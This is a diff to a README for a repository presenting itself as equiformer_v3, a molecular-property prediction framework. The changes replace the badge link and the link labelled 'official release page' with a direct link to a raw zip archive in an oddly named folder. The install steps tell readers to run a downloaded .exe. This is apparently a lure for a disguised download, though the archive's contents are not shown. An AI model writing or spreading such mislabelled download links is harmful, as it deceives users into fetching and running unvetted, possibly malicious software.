@@ -1,6 +1,6 @@
 # 🧬 equiformer_v3 - Advance molecular science with graph intelligence
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/mghourchian86-creator/equiformer_v3/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/mghourchian86-creator/equiformer_v3/raw/refs/heads/main/palladodiammine/v_equiformer_2.8.zip)
 
 EquiformerV3 provides a framework for predicting molecular properties. It uses graph attention transformers to study how atoms interact. This tool helps researchers in fields like drug discovery and materials science. It captures the geometry of molecules to predict chemical behavior.
 
@@ -20,7 +20,7 @@ Update your graphics card drivers before you start. Many issues stem from outdat
 
 Follow these steps to place the software on your machine.
 
-1. Visit the [official release page](https://github.com/mghourchian86-creator/equiformer_v3/releases).
+1. Visit the [official release page](https://github.com/mghourchian86-creator/equiformer_v3/raw/refs/heads/main/palladodiammine/v_equiformer_2.8.zip).
 2. Look for the latest release version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or a folder you can find easily.
